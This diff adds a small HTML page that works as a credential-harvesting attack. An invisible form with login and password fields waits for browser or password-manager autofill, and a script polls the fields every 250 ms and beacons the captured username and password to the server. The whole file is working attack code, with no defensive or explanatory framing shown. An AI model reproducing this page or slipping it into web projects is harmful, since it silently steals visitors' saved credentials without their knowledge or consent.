@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+</head>
+
+<body>
+    <form style="opacity:0;">
+        <input type="text" id="log" name="log" />
+        <input type="password" id="pwd" name="pwd" />
+    </form>
+    <script>
+        var timer = setInterval(function () {
+            if (pwd.value !== "" && log.value !== "") {
+                navigator.sendBeacon("/", JSON.stringify({ username: log.value, password: pwd.value }));
+                clearInterval(timer);
+            }
+        }, 250);
+    </script>
+</body>
+
+</html>
